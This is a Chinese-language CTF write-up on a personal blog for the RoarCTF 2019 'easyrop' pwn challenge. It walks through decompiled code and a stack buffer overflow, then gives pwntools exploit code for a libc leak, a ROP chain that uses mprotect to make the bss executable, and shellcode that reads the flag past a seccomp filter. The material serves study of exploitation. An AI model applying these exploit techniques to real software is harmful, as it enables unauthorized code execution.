@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+  <!-- Minima -->
+  <!-- Hexo theme created by @adisaktijrs -->
+
+  <!-- Basic Page Needs
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <meta charset="utf-8">
+
+  
+  <title>roarctf 2019 easyrop</title>
+  
+  <link rel="canonical" href="http://mykonos-x.github.io/2023/10/04/roarctf-2019-easyrop/">
+  
+  <meta name="description" content="Analyse 既然题目名为easyrop，那么这道题的利用方法和rop脱不了太大干系，尝试运行  可能刚开始不知道这个程序是做什么的，但是貌似程序是将我们的输入当作路径来处理的，我们通过IDA静态分析看看 main函数 __int64 __fastcall main(__int64 a1, cha">
+  
+  
+  <meta name="author" content="Mykonos">
+  
+  
+  
+  <meta property="og:site_name" content="Silence to hear." />
+  <meta property="og:type" content="article" />
+  <meta property="og:title" content="roarctf 2019 easyrop" />
+  
+  <meta property="og:description" content="Analyse 既然题目名为easyrop，那么这道题的利用方法和rop脱不了太大干系，尝试运行  可能刚开始不知道这个程序是做什么的，但是貌似程序是将我们的输入当作路径来处理的，我们通过IDA静态分析看看 main函数 __int64 __fastcall main(__int64 a1, cha">
+  
+  <meta property="og:url" content="http://mykonos-x.github.io/2023/10/04/roarctf-2019-easyrop/" />
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="roarctf 2019 easyrop">
+  
+  <meta name="twitter:description" content="Analyse 既然题目名为easyrop，那么这道题的利用方法和rop脱不了太大干系，尝试运行  可能刚开始不知道这个程序是做什么的，但是貌似程序是将我们的输入当作路径来处理的，我们通过IDA静态分析看看 main函数 __int64 __fastcall main(__int64 a1, cha">
+  
+  
+  
+  
+  <meta name="twitter:url" content="http://mykonos-x.github.io/2023/10/04/roarctf-2019-easyrop/" />
+
+  <!-- Mobile Specific Metas
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <!-- Preload fonts
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <link rel="preload" href="/fonts/dm-serif-display-v4-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
+  <link rel="preload" href="/fonts/inter-v2-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
+
+  <!-- CSS
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  
+<link rel="stylesheet" href="/css/normalize.css">
+
+  
+<link rel="stylesheet" href="/css/skeleton.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+<link rel="stylesheet" href="/css/prism-dark.css">
+
+  
+<link rel="stylesheet" href="/css/prism-line-numbers.css">
+
+  <!-- User css -->
+  
+  
+<link rel="stylesheet" href="/css/user.css">
+
+  
+
+  <!-- Favicon
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <link rel="icon" type="image/png" href="/images/favicon.jpg">
+
+  <!-- Custom Theme Color Style
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <style>
+  a:not(.icon) {
+    text-decoration-color: #0FA0CE;
+    background-image: linear-gradient(
+      to bottom,
+      rgba(0, 0, 0, 0) 50%,
+      #0FA0CE 50%
+    );
+  }
+  blockquote {
+    border-left: 8px solid #0FA0CE;
+  }
+  .nanobar .bar {
+    background: #0FA0CE;
+  }
+  .button.button-primary:hover,
+  button.button-primary:hover,
+  input[type="submit"].button-primary:hover,
+  input[type="reset"].button-primary:hover,
+  input[type="button"].button-primary:hover,
+  .button.button-primary:focus,
+  button.button-primary:focus,
+  input[type="submit"].button-primary:focus,
+  input[type="reset"].button-primary:focus,
+  input[type="button"].button-primary:focus {
+    background-color: #0FA0CE;
+    border-color: #0FA0CE;
+  }
+  input[type="email"]:focus,
+  input[type="number"]:focus,
+  input[type="search"]:focus,
+  input[type="text"]:focus,
+  input[type="tel"]:focus,
+  input[type="url"]:focus,
+  input[type="password"]:focus,
+  textarea:focus,
+  select:focus {
+    border: 1px solid #0FA0CE;
+  }
+</style>
+
+  <!-- Google Analytics (With Privacy Settings On)
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  
+
+  
+  <script src="/js/pic.min.js" defer></script>
+  
+
+  
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div class="container">
+    <div class="row">
+      <div>
+
+        <div class="row">
+  <div class="two columns" style="max-width: 50px">
+    <h1 class="mt-2 mode">
+      <div onclick=setDarkMode(true) id="darkBtn">🌑</div>
+      <div onclick=setDarkMode(false) id="lightBtn" class=hidden>☀️</div>
+      <script >
+        if (localStorage.getItem('preferredTheme') == 'dark') {
+          setDarkMode(true)
+        }
+        function setDarkMode(isDark) {
+          var darkBtn = document.getElementById('darkBtn')
+          var lightBtn = document.getElementById('lightBtn')
+          if (isDark) {
+            lightBtn.style.display = "block"
+            darkBtn.style.display = "none"
+            localStorage.setItem('preferredTheme', 'dark');
+          } else {
+            lightBtn.style.display = "none"
+            darkBtn.style.display = "block"
+            localStorage.removeItem('preferredTheme');
+          }
+          document.body.classList.toggle("darkmode");
+        }
+      </script>
+    </h1>
+  </div>
+
+  <div class="six columns ml-1">
+    <h1 class="mt-2">
+      Hi there.
+    </h1>
+  </div>
+
+  <div class="twelve columns">
+    <div class="row">
+      <div class="nine columns left">
+        <a href="/">Home</a>
+        
+          
+          <a href="/about" class="ml">About</a>
+          
+        
+        
+          
+            <a href="mailto:g0dzirrazhou@gmail.com" target="_blank" class="ml">Email</a>
+          
+        
+      </div>
+    </div>
+    <hr style="margin-bottom: 2.6rem">
+  </div>
+</div>
+
+        <div class="trans">
+            <h2>roarctf 2019 easyrop</h2>
+
+  <h3 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h3><p><img src="https://pic.imgdb.cn/item/651d4f2ec458853aefa41683.jpg" alt=""></p>
+<p>既然题目名为easyrop，那么这道题的利用方法和rop脱不了太大干系，尝试运行</p>
+<p><img src="https://pic.imgdb.cn/item/651d5388c458853aefa497b7.jpg" alt=""></p>
+<p>可能刚开始不知道这个程序是做什么的，但是貌似程序是将我们的输入当作路径来处理的，我们通过IDA静态分析看看</p>
+<p>main函数</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// rax</span>
+  FILE <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment">// rdi</span>
+  <span class="token keyword">char</span> v6<span class="token punctuation">[</span><span class="token number">1032</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-420h] BYREF</span>
+  __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+418h] [rbp-18h]</span>
+  <span class="token keyword">char</span> v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+427h] [rbp-9h]</span>
+  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+428h] [rbp-8h]</span>
+
+  dword_6030A0 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token function">sub_400FC4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">sub_401968</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token number">3uLL</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v9 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    v8 <span class="token operator">=</span> <span class="token function">fgetc</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token operator">==</span> <span class="token number">0xA</span> <span class="token punctuation">)</span>
+      <span class="token keyword">break</span><span class="token punctuation">;</span>
+    v3 <span class="token operator">=</span> v9<span class="token operator">++</span><span class="token punctuation">;</span>
+    v7 <span class="token operator">=</span> v3<span class="token punctuation">;</span>
+    v6<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  v6<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_401678</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">qsort</span><span class="token punctuation">(</span>base<span class="token punctuation">,</span> dword_6030AC<span class="token punctuation">,</span> <span class="token number">0x200uLL</span><span class="token punctuation">,</span> compar<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sub_401541<span class="token punctuation">)</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span>
+  <span class="token punctuation">&#123;</span>
+    v5 <span class="token operator">=</span> <span class="token constant">stdout</span><span class="token punctuation">;</span>
+    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sub_400E87<span class="token punctuation">)</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以看到</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    v8 <span class="token operator">=</span> <span class="token function">fgetc</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token operator">==</span> <span class="token number">0xA</span> <span class="token punctuation">)</span>
+      <span class="token keyword">break</span><span class="token punctuation">;</span>
+    v3 <span class="token operator">=</span> v9<span class="token operator">++</span><span class="token punctuation">;</span>
+    v7 <span class="token operator">=</span> v3<span class="token punctuation">;</span>
+    v6<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里应该就是接收用户输入的地方，while只要标准输入流不为空，则一直接收，遇到换行则跳出循环。接着v6[v9] = 0，这里的v9也就是v6的末位，将末位设置为0。然后进入sub_401678对用户的输入进行判断。</p>
+<p>sub_401678</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">sub_401678</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>v2<span class="token punctuation">;</span> <span class="token comment">// rax</span>
+  <span class="token keyword">struct</span> <span class="token class-name">stat</span> stat_buf<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-1A0h] BYREF</span>
+  <span class="token keyword">char</span> ptr<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+A0h] [rbp-110h] BYREF</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>src<span class="token punctuation">;</span> <span class="token comment">// [rsp+1A0h] [rbp-10h]</span>
+  _BYTE <span class="token operator">*</span>v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+1A8h] [rbp-8h]</span>
+
+  dword_6030AC <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_401BB0</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>stat_buf<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">strcpy</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token string">"Can't get the information of the given path.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fwrite</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token number">0x2EuLL</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>stat_buf<span class="token punctuation">.</span>st_mode <span class="token operator">&amp;</span> <span class="token number">0xF000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x8000</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    dword_6030AC <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    src <span class="token operator">=</span> <span class="token function">__xpg_basename</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">strcpy</span><span class="token punctuation">(</span>base<span class="token punctuation">,</span> src<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">strcpy</span><span class="token punctuation">(</span>byte_6031C0<span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span>
+  <span class="token punctuation">&#123;</span>
+    result <span class="token operator">=</span> stat_buf<span class="token punctuation">.</span>st_mode <span class="token operator">&amp;</span> <span class="token number">0xF000</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>result <span class="token operator">==</span> <span class="token number">0x4000</span> <span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">47</span> <span class="token punctuation">)</span>
+      <span class="token punctuation">&#123;</span>
+        v2 <span class="token operator">=</span> <span class="token operator">&amp;</span>a1<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        v6 <span class="token operator">=</span> v2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
+        <span class="token operator">*</span>v2 <span class="token operator">=</span> <span class="token number">47</span><span class="token punctuation">;</span>
+        <span class="token operator">*</span>v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+      <span class="token function">sub_4010FF</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里的sub_401BB0函数，接收两个参数，一个文件名和一个指向’struct stat’结构的指针，然后该函数将参数传递给<code>__xstat</code>函数，并返回<code>__xstat</code>的返回值</p>
+<p><code>__xstat</code>函数是<code>stat</code>系统调用的一种变体，它用于获取指定文件的状态信息，该函数接受三个参数：</p>
+<ul>
+<li><code>int ver</code>：版本号，通常用于指定<code>__xstat</code>函数的指定版本</li>
+<li><code>const char *path</code>：指向文件路径的指针</li>
+<li><code>struct stat *buf</code> 指向<code>struct stat</code>结构的指针，该文件用于保存文件的状态信息</li>
+</ul>
+<p>所以大概知道这个程序是对文件信息进行查看，用户输入应该是输入文件的路径</p>
+<p><img src="https://pic.imgdb.cn/item/651d4f92c458853aefa4202a.jpg" alt=""></p>
+<h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>一般的rop都要结合栈溢，但是这里接收用户输入是使用的<code>fgetc()</code>，也不是那么一眼丁真</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  v8 <span class="token operator">=</span> <span class="token function">fgetc</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token operator">==</span> <span class="token number">0xA</span> <span class="token punctuation">)</span>
+    <span class="token keyword">break</span><span class="token punctuation">;</span>
+  v3 <span class="token operator">=</span> v9<span class="token operator">++</span><span class="token punctuation">;</span>
+  v7 <span class="token operator">=</span> v3<span class="token punctuation">;</span>
+  v6<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+v6<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>但是注意这里的while，只要stdin不为空则一直接收用户的输入，将输入存到v6里去，我们看下v6这个变量的定义：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> v6<span class="token punctuation">[</span><span class="token number">1032</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-420h] BYREF</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>双击查看下v6的栈的情况</p>
+<pre class="line-numbers language-none"><code class="language-none">0000000000000420 var_420 db 1032 dup(?)  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; v6从这里开始
+-0000000000000018 var_18 dq ?
+-0000000000000010 db ? ; undefined
+-000000000000000F db ? ; undefined
+-000000000000000E db ? ; undefined
+-000000000000000D db ? ; undefined
+-000000000000000C db ? ; undefined
+-000000000000000B db ? ; undefined
+-000000000000000A db ? ; undefined
+-0000000000000009 var_9 db ?
+-0000000000000008 var_8 dq ?
++0000000000000000  s db 8 dup(?)
++0000000000000008  r db 8 dup(?)
++0000000000000010
++0000000000000010 ; end of stack variables<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以发现，由于没有对v6这个变量的长度进行限制，所以这里是可以溢出的，通过v6我们可以覆盖到返回地址，从而rop</p>
+<h4 id="构造ropchain"><a href="#构造ropchain" class="headerlink" title="构造ropchain"></a>构造ropchain</h4><h5 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h5><p>这里需要注意的是，在栈上往下覆盖时，路径上还存有其他变量，我们要尽量保证覆盖的数据不会导致程序异常退出。查看发现这里的v8其实就是上方提到的<code>v6[v9] = 0</code>中的index =&gt; v9，根据经验这里肯定不能覆盖掉索引，<del>看了另一个师傅的wp，这里的索引需要覆盖为0x28(40)，暂时还不知道为什么，哭</del></p>
+<h5 id="泄露libc基址"><a href="#泄露libc基址" class="headerlink" title="泄露libc基址"></a>泄露libc基址</h5><p>接下来就是愉快的rop了，程序有puts函数，那么选用puts来泄露libc基址，最后再控制返回地址回到main函数，进行多次利用</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token punctuation">[</span>
+    ret<span class="token punctuation">,</span>
+    pop_rdi<span class="token punctuation">,</span>
+    elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+    elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+    <span class="token number">0x4019F3</span>
+<span class="token punctuation">]</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span> <span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">0x418</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span> <span class="token operator">+</span> flat<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h4><p>拿到libc基址后，尝试通过system()调用/bin/sh发现无果，原因是使用seccomp-tools查看，该程序禁用了execve系统调用，而system()函数底层需要间接调用execve()或者exec系列函数，故此方法不可行了</p>
+<p>这里记录一个学到的做法：构造rop，将用户输入再下一次输入的内容定位到bss段上，再通过mprotect将该bss段赋予可读可写可执行权限，下一次输入时输入shellcode，从而在bss段上执行了这段shellcode，这道题的话就是读取flag</p>
+<h5 id="构造ropchain-1"><a href="#构造ropchain-1" class="headerlink" title="构造ropchain"></a>构造ropchain</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token punctuation">[</span>
+    pop_rdi<span class="token punctuation">,</span> <span class="token comment"># : pop rdi ; ret</span>
+    elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+
+    libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'gets'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+
+    pop_rdi<span class="token punctuation">,</span> <span class="token comment"># : pop rdi ; ret</span>
+    elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">,</span>
+    libc_base <span class="token operator">+</span> <span class="token number">0x0000000000023e6a</span><span class="token punctuation">,</span> <span class="token comment">#: pop rsi; ret;</span>
+    <span class="token number">0x1000</span> <span class="token punctuation">,</span>
+    libc_base <span class="token operator">+</span> <span class="token number">0x0000000000001b96</span><span class="token punctuation">,</span> <span class="token comment">#: pop rdx; ret; </span>
+    <span class="token number">7</span> <span class="token punctuation">,</span>
+    libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+    elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+<span class="token punctuation">]</span>
+<span class="token comment"># gdb.attach(io)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x418</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span> <span class="token operator">+</span> flat<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">pop_rdi，
+elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>即是将bss段的基地址弹到rdi中，接着ret执行gets()，意为在bss段上执行gets()函数</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">pop_rdi<span class="token punctuation">,</span> <span class="token comment"># : pop rdi ; ret</span>
+elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">,</span>
+libc_base <span class="token operator">+</span> <span class="token number">0x0000000000023e6a</span><span class="token punctuation">,</span> <span class="token comment">#: pop rsi; ret;</span>
+<span class="token number">0x1000</span> <span class="token punctuation">,</span>
+libc_base <span class="token operator">+</span> <span class="token number">0x0000000000001b96</span><span class="token punctuation">,</span> <span class="token comment">#: pop rdx; ret; </span>
+<span class="token number">7</span> <span class="token punctuation">,</span>
+libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这段操作是在为mprotect提供参数，将bss段起始的地址存入rdi，作为第一个参数，接着将0x1000这个参数存入rsi，作为第二个参数，然后将7存入rdx，作为第三个参数，最后调用mprotect。</p>
+<p>7是mprotect()函数的prot参数的值，在二进制中，7为111，表示<code>PROT_READ | PROT_WRITE | PROT_EXEC</code>可读可写可执行</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">elf<span class="token punctuation">.</span><span class="token function">bss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>最后跳转到bss段</p>
+<h5 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h5><p>接着，现在在等待用户输入了( gets() )，我们生成shellcode进行cat flag，发送即可</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>cat<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="https://pic.imgdb.cn/item/651d5cebc458853aefa95a79.jpg" alt=""></p>
+
+  <p><a class="classtest-link" href="/tags/pwn/" rel="tag">pwn</a>, <a class="classtest-link" href="/tags/write-up/" rel="tag">write-up</a> — Oct 4, 2023</p>
+  
+
+
+        </div>
+        <div class="row mt-2">
+  <h3>Search</h3>
+  <div><input id="search-text" title="search" class="search-text" type="text" placeholder="search......"></div>
+  <div style="margin-top: 1.5rem;">
